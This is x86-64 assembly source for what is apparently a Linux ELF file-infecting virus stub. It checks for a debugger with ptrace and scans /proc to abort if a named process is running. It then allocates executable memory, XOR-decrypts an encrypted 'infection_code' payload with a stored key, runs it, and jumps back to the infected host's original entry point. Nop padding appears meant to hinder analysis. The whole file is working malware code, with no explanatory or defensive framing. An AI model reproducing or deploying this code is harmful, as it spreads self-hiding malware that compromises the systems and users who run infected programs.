%define DIR_FD_OFFSET  8
%define DIRENT_BUF_OFFSET (DIR_FD_OFFSET + 4096)
%define PATH_OFFSET (DIRENT_BUF_OFFSET + 4096)
%define FILE_FD_OFFSET (PATH_OFFSET + 8)
%define COMM_BUFF_OFFSET (FILE_FD_OFFSET + 5)
%define STRUCT_SIZE (COMM_BUFF_OFFSET)



%define VIRUS_SIZE  (_end - _start)
%define BUFF_SIZE 4096

%define SYS_EXIT     60
%define SYS_OPEN     2
%define SYS_READ     0
%define SYS_GETDENTS 78
%define SYS_MMAP     9
%define SYS_FSTAT    5
%define SYS_MUNMAP   11
%define SYS_CLOSE    3
%define SYS_PTRACE   101
%define DT_DIR       4
%define DT_REG       8


struc vars
    dir_fd:         resq 1
    dirent_buf:     resb 4096
    path:           resb 4096
    file_fd:        resq 1
    comm_buff:      resb 5
endstruc

section .text
global _start


_exit:
    mov     rax, SYS_EXIT
    xor     rdi, rdi                   
    syscall

_start:

    push    rbp
    mov     rbp, rsp
    sub     rbp, STRUCT_SIZE

    push	rsi
    push	rdx
    push	rcx
    push	rdi

    lea     rax, [rel _start]
    mov     rcx, [rel original_entry]
    sub     rax, rcx
    push    rax

    call   _is_being_debugged
    test   rax, rax
    jnz    .quit 

    lea     rdi, [rel proc_dir]
    call    _check_active_process
    cmp     rax, 1
    je      .quit

    mov     rdi, 0                
    mov     rsi, 4096             
    mov     rdx, 7                
    mov     r10, 0x22             
    xor     r8, r8                
    xor     r9, r9                
    mov     rax, 9                
    syscall

    mov     rdi, rax



.mmap_executable:
    mov rdi, 0                
    mov rsi, 4096             
    mov rdx, 0x7             
    mov r10, 0x22            
    mov r8, -1               
    mov r9, 0                
    mov eax, 9               
    syscall

    cmp rax, -4095
    jae .quit

    mov     rdi, rax                    
    push    rax
    lea     rsi, [rel infection_code] 
    lea     rbx, [rel key]
    mov     r10,8
    mov     r11, 0
    lea     r12,[rel _decrypt_loop]
    call    _decrypt_loop

    lea     rdi ,[rel _start]
    lea     rsi ,[rel _end]

    lea     rdx, [rel original_entry]
    lea     rcx, [rel _decrypt_loop]
    lea     r8,  [rel infection_code]
    lea     r10, [rel signature]
    lea     rbx, [rel key]
    pop     rax
    call    rax
    jmp     .quit

.quit:
    pop		rax
    pop		rdi
    pop		rcx
    pop		rdx
    pop		rsi
    pop		rbp
    jmp		rax


_is_being_debugged:
    mov rax, SYS_PTRACE        
    mov rdi, 0              
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    syscall
    ret


_check_active_process:
    mov     r15, rdi                    
    mov     rax, SYS_OPEN
    xor     rsi, rsi                    
    syscall
    cmp     rax, -1
    jle     .return_parsing
    mov     [rbp - DIR_FD_OFFSET], rax

.read_proc_dir:
    mov     rax,  SYS_GETDENTS
    lea     rdi, [rbp - DIR_FD_OFFSET]
    mov     rdi, [rdi]
    lea     rsi, [rbp - DIRENT_BUF_OFFSET]
    mov     rdx,  BUFF_SIZE
    syscall
    test    rax, rax
    jle     .close_dir

    mov     r12, rax
    xor     r13, r13

.read_proc_entries:
    cmp     r12, r13
    jle     .read_proc_dir
    xor     r10, r10
    lea     rdi, [rbp - DIRENT_BUF_OFFSET]
    add     rdi, r13
    movzx	r10, word [rdi + 16]        
    xor     rax,rax
   	mov	    al,  byte [rdi + r10 - 1]  
    lea     rsi, [rdi  + 18]          
    add     r13, r10
    cmp     al,  DT_DIR
    jne     .read_proc_entries
    push    r15
    jmp    _parse_directories

.loop_read_entry_files:
    xor     r15,r15
    pop     r15
    jmp     .read_proc_entries

.close_dir:
    mov     rdi, [rbp - DIR_FD_OFFSET]
    mov     rax, 3
    syscall

.return_parsing:
    mov    rax, 0
    ret

_parse_directories:
    mov     rdi, r15
    lea     rdx, [rbp - PATH_OFFSET]

.dirname:
    mov     al, byte [rdi]
    test    al, al
    jz      .filename
    mov     byte [rdx], al
    inc     rdi
    inc     rdx
    jmp     .dirname
    
.filename:
    mov     al, byte [rsi]
    test    al, al
    jz      .find_process_name
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .dirname

.find_process_name:
    lea    rsi, [rel comm_file]

.concat_comm:
    mov     al, byte [rsi]
    test    al, al
    jz      .open_comm_file
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .concat_comm

.open_comm_file:
    mov     byte [rdx], 0
    lea     rdi, [rbp - PATH_OFFSET]
    mov     rax, 2
    mov     rsi, 0
    syscall
    cmp     rax, 0
    jg      .check_comm_name
    jmp     _check_active_process.loop_read_entry_files

.check_comm_name:
    mov     rdi, rax
    mov     [rbp - FILE_FD_OFFSET],rax
    mov     rax, SYS_READ
    lea     rsi, [rbp - COMM_BUFF_OFFSET]  
    mov     rdx, 7               
    syscall

    cmp     rax, 0
    jle     .close_file

    lea     rdi, [rel process_name]
    mov     rcx, 7           
    repe    cmpsb
    jne     .close_file
    mov     rax, 1
    pop     r15
    ret


.close_file:
    mov     rdi, [rbp - FILE_FD_OFFSET]
    mov     rax, SYS_CLOSE
    syscall
    jmp     _check_active_process.loop_read_entry_files


_decrypt_loop:
    mov     rax, r11
    nop
    xor     rdx, rdx
    nop
    div     r10
    nop
    push    r11
    movzx   rcx, byte [rsi]
    nop
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    nop
    inc     rsi
    nop
    inc     rdi
    pop     r11
    nop
    inc     r11
    cmp     r11, 0x711 
    je      .return
    jmp     r12
.return:
    ret

